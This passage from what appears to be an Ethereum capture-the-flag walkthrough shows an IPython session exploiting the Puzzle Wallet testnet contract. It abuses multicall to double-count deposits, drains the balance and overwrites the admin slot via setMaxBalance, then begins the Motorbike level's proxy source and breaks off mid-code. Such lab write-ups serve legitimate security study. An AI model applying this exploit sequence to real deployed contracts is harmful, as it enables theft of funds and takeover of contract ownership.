class="number">2383194</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">23966</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">23966</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x94e4ff6939b4cb9b3c1f492a480fa7f4302e616e90674b86289e3556aa3f7d31&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">557</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">557</span>]: HexBytes(<span class="string">&#x27;0x00000000000000000000000025bf651a048be8420997944c92c80e5064c1c5d6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">558</span>]: addtowhitelist_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;addToWhitelist(address)&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">559</span>]: addtowhitelist_selector</span><br><span class="line">Out[<span class="number">559</span>]: <span class="string">&#x27;0xe43252d7&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">560</span>]: calldata = addtowhitelist_selector + pub[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">561</span>]: calldata</span><br><span class="line">Out[<span class="number">561</span>]: <span class="string">&#x27;0xe43252d700000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">562</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">563</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">564</span>]: tx</span><br><span class="line">Out[<span class="number">564</span>]:</span><br><span class="line">&#123;<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0xe43252d700000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>,</span><br><span class="line"> <span class="string">&#x27;nonce&#x27;</span>: <span class="number">339</span>,</span><br><span class="line"> <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;gas&#x27;</span>: <span class="number">33483</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">565</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">566</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">567</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">567</span>]: HexBytes(<span class="string">&#x27;0x00000000000000000000000025bf651a048be8420997944c92c80e5064c1c5d6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">568</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">568</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xc83921ff00d4046f14c2bf24365c1aa0fb6158e0678329b630b58bfed5dcda70&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383196</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">31218</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">31218</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xbf6f02cb48561e75a2972dc7ed8a77bbca502947d647e575e0f93fd7d57b14fb&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">569</span>]: calldata = <span class="string">&#x27;&#x27;&#x27;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000400000000</span></span><br><span class="line"><span class="string">     ...: 0000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">     ...: 00000000000000000000000000a4ac9650d800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">     ...: 00000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">570</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">571</span>]: io.eth.get_balance(ad)</span><br><span class="line">Out[<span class="number">571</span>]: <span class="number">1000000000000000</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">572</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price, <span class="string">&#x27;value&#x27;</span>: io.eth.get_balance(ad)&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">573</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">574</span>]: tx</span><br><span class="line">Out[<span class="number">574</span>]:</span><br><span class="line">&#123;<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0xac9650d800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>,</span><br><span class="line"> <span class="string">&#x27;nonce&#x27;</span>: <span class="number">340</span>,</span><br><span class="line"> <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;value&#x27;</span>: <span class="number">1000000000000000</span>,</span><br><span class="line"> <span class="string">&#x27;gas&#x27;</span>: <span class="number">64207</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">575</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">576</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">577</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">577</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x43c6b94d62f24476fe8f06976b35d1332511918cf1f00138947959ede1b72138&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383204</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">61724</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">61724</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x81d0d7075c855e6432f37526b8aa506660e0f431f10d253878fa17c64a6b65af&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">578</span>]: io.eth.get_balance(ad)</span><br><span class="line">Out[<span class="number">578</span>]: <span class="number">2000000000000000</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">579</span>]: calldata = <span class="string">&#x27;&#x27;&#x27;0xb61d27f600000000000000000000000025bf651a048be8420997944c92c80e5064c1c5d600000000000000000000000000000000000000000000000000071afd498d000000000000000000000000000000000000000000000000000000000000000000600000000</span></span><br><span class="line"><span class="string">     ...: 000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">580</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">581</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">582</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">583</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">584</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">584</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x7a7a2f5db57ae7c8e485686fe796c3263ab73fd949d68b3c2dcf344f6b8216f0&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383220</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">37158</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">37158</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x015cfc32c92f00a41cdbc72d8d3bb120a2276bb02a53d9395c09e47e34d350fa&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">585</span>]: io.eth.get_balance(ad)</span><br><span class="line">Out[<span class="number">585</span>]: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [<span class="number">586</span>]: setmaxbalance_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;setMaxBalance(uint256)&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">587</span>]: setmaxbalance_selector</span><br><span class="line">Out[<span class="number">587</span>]: <span class="string">&#x27;0x9d51d9b7&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">592</span>]: calldata = setmaxbalance_selector + pub[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">593</span>]: calldata</span><br><span class="line">Out[<span class="number">593</span>]: <span class="string">&#x27;0x9d51d9b700000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">594</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">595</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">596</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">597</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">599</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">599</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xaacdaa8ad4732671a8bfcf4ce6024a4d9f5290b2750a6b192e474c9499f54f76&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383250</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">387033</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">33863</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x41a43e208ed44d90dab73ee0f270b2c4979afcee54f1896f0b9d995d36011024&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">4</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25 - Motorbike"></a>25 - Motorbike</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity &lt;<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-06/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Motorbike</span> &#123;</span><br><span class="line">    <span class="comment">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span></span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = <span class="number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span>;</span><br><span class="line">    </span><br><span class="line">    struct <span class="title class_">AddressSlot</span> &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _logic</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">Address</span>.<span class="title function_">isContract</span>(_logic), <span class="string">&quot;ERC1967: new implementation is not a contract&quot;</span>);</span><br><span class="line">        <span class="title function_">_getAddressSlot</span>(_IMPLEMENTATION_SLOT).<span class="property">value</span> = _logic;</span><br><span class="line">        (bool success,) = _logic.<span class="title function_">delegatecall</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;initialize()&quot;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;Call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delegates the current call to `implementation`.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_delegate</span>(<span class="params">address implementation</span>) internal virtual &#123;</span><br><span class="line">        <span class="comment">// solhint-disable-next-line no-inline-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="title function_">calldatacopy</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="title function_">calldatasize</span>())</span><br><span class="line">            <span class="keyword">let</span> result := <span class="title function_">delegatecall</span>(<span class="title function_">gas</span>(), implementation, <span class="number">0</span>, <span class="title function_">calldatasize</span>(), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="title function_">returndatacopy</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="title function_">returndatasize</span>())</span><br><span class="line">            <span class="keyword">switch</span> result</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> &#123; <span class="title function_">revert</span>(<span class="number">0</span>, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">            <span class="keyword">default</span> &#123; <span class="keyword">return</span>(<span class="number">0</span>, <span class="title function_">returndatasize</span>()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fallback function that delegates calls to the address returned by `_implementation()`. </span></span><br><span class="line">    <span class="comment">// Will run if no other function in the contract matches the call data</span></span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        <span class="title function_">_delegate</span>(<span class="title function_">_getAddressSlot</span>(_IMPLEMENTATION_SLOT).<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returns an `AddressSlot` with member `value` located at `slot`.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_getAddressSlot</span>(<span class="params">bytes32 slot</span>) internal pure returns (<span class="title class_">AddressSlot</span> storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Engine</span> is <span class="title class_">Initializable</span> &#123;</span><br><span class="line">    <span class="comment">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span></span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = <span class="number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span>;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct <span class="title class_">AddressSlot</span> &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">initialize</span>(<span class="params"></span>) external initializer &#123;</span><br><span class="line">        horsePower = <span class="number">1000</span>;</span><br><span class="line">        upgrader = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Upgrade the implementation of the proxy to `newImplementation`</span></span><br><span class="line">    <span class="comment">// subsequently execute the function call</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">upgradeToAndCall</span>(<span class="params">address newImplementation, bytes memory data</span>) external payable &#123;</span><br><span class="line">        <span class="title function_">_authorizeUpgrade</span>();</span><br><span class="line">        <span class="title function_">_upgradeToAndCall</span>(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Restrict to upgrader role</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_authorizeUpgrade</span>(<span class="params"></span>) internal view &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == upgrader, <span class="string">&quot;Can&#x27;t upgrade&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title 